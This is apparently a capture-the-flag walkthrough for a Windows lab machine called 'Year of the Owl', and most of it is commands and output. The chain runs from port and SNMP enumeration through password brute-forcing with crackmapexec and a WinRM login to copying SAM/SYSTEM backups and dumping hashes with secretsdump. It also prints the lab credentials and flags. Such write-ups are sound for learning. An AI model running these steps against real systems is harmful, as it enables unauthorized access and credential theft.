CTF URL:
# IP
```
10.10.83.74
```
# Reconaisance
## NMAP
```bash
nmap -p- -T4 -Pn 10.10.83.74 -v
80/tcp    open  http
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm

nmap -p80,139,443,445,3306,3389,5985,47001 -sS -sC -sV 10.10.83.74 -v
# result

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-title: Year of the Owl
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-title: Year of the Owl
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL, WMSRequest: 
|_    Host 'ip-10-8-35-156.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: YEAR-OF-THE-OWL
|   NetBIOS_Domain_Name: YEAR-OF-THE-OWL
|   NetBIOS_Computer_Name: YEAR-OF-THE-OWL
|   DNS_Domain_Name: year-of-the-owl
|   DNS_Computer_Name: year-of-the-owl
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-26T09:31:18+00:00
|_ssl-date: 2024-05-26T09:31:57+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=year-of-the-owl
| Issuer: commonName=year-of-the-owl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-25T09:22:37
| Not valid after:  2024-11-24T09:22:37
| MD5:   6da9:3b03:9b63:3ae0:ee6a:4066:27e8:7120
|_SHA-1: 9957:df39:fc08:1362:16b1:bd8b:2534:7a33:e647:4fd0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94SVN%I=7%D=5/26%Time=6653015A%P=x86_64-pc-linux-gnu%r
SF:(NULL,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-8-35-156\.eu-west-1\.compute
SF:\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20M
SF:ariaDB\x20server")%r(WMSRequest,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-8-
SF:35-156\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20
SF:connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-26T09:31:18
|_  start_date: N/A
```

```bash
nmap -p5357 -sS -sC 10.10.83.74
# additionally
5357/tcp filtered wsdapi
```
## WEB 80/443
not interesting website with owl pic
### Dirb
```bash
dirb http://10.10.83.74/
# result
+ http://10.10.83.74/aux (CODE:403|SIZE:301)                                                                                                                          
+ http://10.10.83.74/cgi-bin/ (CODE:403|SIZE:301)                                                                                                                     
+ http://10.10.83.74/com1 (CODE:403|SIZE:301)                                                                                                                         
+ http://10.10.83.74/com2 (CODE:403|SIZE:301)                                                                                                                         
+ http://10.10.83.74/com3 (CODE:403|SIZE:301)                                                                                                                         
+ http://10.10.83.74/con (CODE:403|SIZE:301)                                                                                                                          
+ http://10.10.83.74/examples (CODE:503|SIZE:401)                                                                                                                     
+ http://10.10.83.74/index.php (CODE:200|SIZE:252)                                                                                                                    
+ http://10.10.83.74/licenses (CODE:403|SIZE:420)                                                                                                                     
+ http://10.10.83.74/lpt1 (CODE:403|SIZE:301)                                                                                                                         
+ http://10.10.83.74/lpt2 (CODE:403|SIZE:301)                                                                                                                         
+ http://10.10.83.74/nul (CODE:403|SIZE:301)                                                                                                                          
+ http://10.10.83.74/phpmyadmin (CODE:403|SIZE:301)                                                                                                                   
+ http://10.10.83.74/prn (CODE:403|SIZE:301)                                                                                                                          
+ http://10.10.83.74/server-info (CODE:403|SIZE:420)                                                                                                                  
+ http://10.10.83.74/server-status (CODE:403|SIZE:420)                                                                                                                
+ http://10.10.83.74/webalizer (CODE:403|SIZE:301) 
# server error
http://10.10.83.74/examples
# others are forbidden besides index page
```
## WEB 5985/47001
Not found only
## SMB 139/445
#### nmap
```bash
nmap -p139,445 -Pn --script smb* 10.10.83.74 -v 
# result
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-mbenum: 
|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb2-time: 
|   date: 2024-05-26T10:29:25
|_  start_date: N/A
|_smb-vuln-ms10-054: false
| smb2-capabilities: 
|   2:0:2: 
|     Distributed File System
|   2:1:0: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:0:0: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:0:2: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:1:1: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-print-text: false
| smb-protocols: 
|   dialects: 
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
|_smb-flood: ERROR: Script execution failed (use -d to debug)
```
nothing
## RDP 3389
domain: `year-of-the-owl`
## MariaDB 3306
nothing
	# SNMP
it is said that there is a snmp server
# SNMP
## Recon
```bash
nmap -sU -p 161 --script=snmp* 10.10.83.74
# result
PORT    STATE         SERVICE REASON
161/udp open|filtered snmp    no-response
```
## Enum
```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/SNMP/snmp-onesixtyone.txt
onesixtyone 10.10.83.74 -c snmp-onesixtyone.txt
# Scanning 1 hosts, 3218 communities
# 10.10.83.74 [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```
we got community string `openview`
```bash
snmp-check -c openview 10.10.83.74
# resukt
[*] System information:
  Hostname                      : year-of-the-owl
  Domain                        : WORKGROUP
[*] User accounts:

  Guest               
  Jareth              
  Administrator       
  DefaultAccount      
  WDAGUtilityAccount  
```
`Jareth`
# OSINT 
```
Jareth is a fictional character and the main antagonist of the 1986 musical fantasy film Labyrinth. Portrayed by David Bowie, Jareth is the powerful and enigmatic king of the goblins to whom protagonist Sarah Williams wishes away her baby brother Toby. Wikipedia
```
# SMB
```bash
crackmapexec smb 10.10.83.74 -u Jareth -p /usr/share/wordlists/rockyou.txt
# sarah
```
`Jareth:sarah`
```bash
evil-winrm -i 10.10.83.74 -u Jareth -p sarah
*Evil-WinRM* PS C:\Users\Jareth\Documents> whoami                                                                                                           
year-of-the-owl\jareth
*Evil-WinRM* PS C:\Users\Jareth>type Desktop/user.txt
THM{Y2I0NDJjODY2NTc2YmI2Y2U4M2IwZTBl}
```
# PrivEsc
```bash
whoami /all
cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak

copy sam.bak C:\Windows\Temp\sam.bak
copy system.bak C:\Windows\Temp\system.bak
download C:\Windows\Temp\sam.bak
download C:\Windows\Temp\system.bak
```
dump hashes
```bash
impacket-secretsdump -ts local -system system.bak -sam sam.bak
```
after login and reading the flag:
`THM{YWFjZTM1MjFiZmRiODgyY2UwYzZlZWM2}`